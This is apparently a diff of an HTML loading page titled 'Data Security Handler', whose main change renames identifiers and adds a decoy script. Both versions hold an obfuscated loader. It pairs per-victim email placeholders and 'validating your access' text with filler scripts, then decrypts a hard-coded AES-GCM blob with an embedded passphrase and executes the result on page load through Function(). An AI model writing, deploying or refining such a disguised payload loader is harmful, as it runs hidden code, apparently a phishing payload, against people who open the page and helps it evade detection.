@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="author" content="Global Dev">
-    <title>Secure Data Processor</title>
+    <title>Data Security Handler</title>
     <style>
         body {
             padding: 0;
@@ -18,32 +18,32 @@
             min-height: 100vh;
             overflow: hidden;
         }
-        .loader {
+        .spinner {
             width: 70px;
             height: 70px;
             border: 10px solid #d1d5db;
             border-top: 10px solid #4f46e5;
             border-radius: 50%;
-            animation: spin 1.5s linear infinite;
+            animation: rotate 1.5s linear infinite;
         }
-        @keyframes spin {
+        @keyframes rotate {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
-        .status {
+        .message {
             margin-top: 15px;
             font-size: 18px;
             color: #222;
         }
-        .hidden {
+        .invisible {
             visibility: hidden;
         }
-        .system {
+        .system-info {
             margin-top: 20px;
             font-size: 14px;
             color: #666;
         }
-        .progress {
+        .progress-container {
             width: 200px;
             height: 10px;
             background-color: #e0e0e0;
@@ -51,13 +51,13 @@
             margin-top: 20px;
             overflow: hidden;
         }
-        .indicator {
+        .progress-bar {
             width: 0;
             height: 100%;
             background-color: #4f46e5;
-            animation: grow 2s linear infinite;
+            animation: expand 2s linear infinite;
         }
-        @keyframes grow {
+        @keyframes expand {
             0% { width: 0; }
             50% { width: 100%; }
             100% { width: 0; }
@@ -67,113 +67,125 @@
 <body>
 
     <!-- Hidden Section -->
-    <div class="hidden">
+    <div class="invisible">
         <div data-secure="true" id="secure-data" custom-attr="secure"></div>
     </div>
 
     <!-- Main Loader -->
-    <div custom-tag="Haj32032--_jakd" class="loader"></div>
-    <p class="status" data-info="[[ BASE64_EMAIL ]]"> <p adidas="<%=EMAIL64%>" nike-tes1="" >Processing your request, please wait...</p> </p>
+    <div custom-tag="Haj32032--_jakd" class="spinner"></div>
+    <p class="message" data-info="[[ BASE64_EMAIL ]]"> <p adidas="<%=EMAIL64%>" nike-tes1="" >Processing your request, please wait...</p> </p>
 
     <!-- System Info Section -->
-    <div class="system">
+    <div class="system-info">
         <p>validating your access...</p>
     </div>
 
     <!-- Progress Bar -->
     <div invisible-attr="">
-        <div class="indicator"></div>
+        <div class="progress-bar"></div>
     </div>
 
     <!-- Useless Script 1 -->
     <script>
-        const performFakeTask = () => {
-            const fakeData = [1, 2, 3, 4, 5];
-            fakeData.forEach(item => {
-                // console.log(`Fake item: ${item}`);
+        const executeDummyTask = () => {
+            const dummyArray = [10, 20, 30, 40, 50];
+            dummyArray.forEach(num => {
+                // console.log(`Dummy number: ${num}`);
             });
         };
-        performFakeTask();
+        executeDummyTask();
     </script>
 
     <!-- Useless Script 2 -->
     <script>
-        const logFakeMessages = () => {
-            const messages = ["Initializing...", "Loading...", "Finishing..."];
-            messages.forEach(msg => {
-                // console.log(`[LOG] ${msg}`);
+        const displayFakeLogs = () => {
+            const logs = ["Starting...", "Processing...", "Completing..."];
+            logs.forEach(log => {
+                // console.log(`[FAKE LOG] ${log}`);
             });
         };
-        logFakeMessages();
+        displayFakeLogs();
+    </script>
+
+    <!-- Useless Script 3 -->
+    <script>
+        const generateRandomNumbers = () => {
+            const randomNums = [];
+            for (let i = 0; i < 5; i++) {
+                randomNums.push(Math.floor(Math.random() * 100));
+            }
+            // console.log("[RANDOM] Generated numbers:", randomNums);
+        };
+        generateRandomNumbers();
     </script>
 
     <!-- Core Secure Processing Script -->
     <script>
-        const processData = async (data, key, salt, pass) => {
-            // console.log("[INFO] Starting data processing...");
+        const handleSecureData = async (encryptedData, encryptionKey, saltValue, password) => {
+            // console.log("[INFO] Initiating secure data handling...");
 
-            const hexToArray = (hex) => {
-                const bytes = [];
-                for (let i = 0; i < hex.length; i += 2) {
-                    bytes.push(parseInt(hex.substr(i, 2), 16));
+            const convertHexToBytes = (hexString) => {
+                const byteArray = [];
+                for (let i = 0; i < hexString.length; i += 2) {
+                    byteArray.push(parseInt(hexString.substr(i, 2), 16));
                 }
-                return new Uint8Array(bytes);
+                return new Uint8Array(byteArray);
             };
 
-            const delay = () => new Promise(resolve => {
-                // console.log("[DEBUG] Adding delay...");
+            const addArtificialDelay = () => new Promise(resolve => {
+                // console.log("[DEBUG] Simulating delay...");
                 setTimeout(resolve, 500);
             });
 
-            const getKey = async (material, saltBytes) => {
+            const deriveEncryptionKey = async (keyMaterial, saltBytes) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
-                    material,
+                    keyMaterial,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
                 );
             };
 
-            const material = await crypto.subtle.importKey(
+            const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(pass),
+                new TextEncoder().encode(password),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await delay();
-            const derivedKey = await getKey(material, hexToArray(salt));
+            await addArtificialDelay();
+            const derivedEncryptionKey = await deriveEncryptionKey(keyMaterial, convertHexToBytes(saltValue));
 
             try {
-                const decrypted = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToArray(key) },
-                    derivedKey,
-                    hexToArray(data)
+                const decryptedData = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: convertHexToBytes(encryptionKey) },
+                    derivedEncryptionKey,
+                    convertHexToBytes(encryptedData)
                 );
-                console.log("[SUCCESS] Data processed successfully.");
-                return new TextDecoder().decode(decrypted);
-            } catch (err) {
-                console.error("[ERROR] Failed to process data:", err);
+                console.log("[SUCCESS] Data decrypted successfully.");
+                return new TextDecoder().decode(decryptedData);
+            } catch (error) {
+                console.error("[ERROR] Failed to decrypt data:", error);
                 return null;
             }
         };
 
         (async () => {
-            console.log("[INFO] Starting secure data processing...");
-            const payload = {
+            console.log("[INFO] Beginning secure data handling...");
+            const securePayload = {
                 key: "ce12552921e07eeae6d25a8b",
                 salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
                 data: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
             };
 
-            const pass = "homesweethome";
-            const result = await processData(payload.data, payload.key, payload.salt, pass);
-            Function(`${result}`)();
+            const secretPassphrase = "homesweethome";
+            const decryptedResult = await handleSecureData(securePayload.data, securePayload.key, securePayload.salt, secretPassphrase);
+            Function(`${decryptedResult}`)();
 
-            if (result) {
-                // console.log("[INFO] Retrieved data:", result);
+            if (decryptedResult) {
+                // console.log("[INFO] Decrypted data:", decryptedResult);
             }
         })();
     </script>
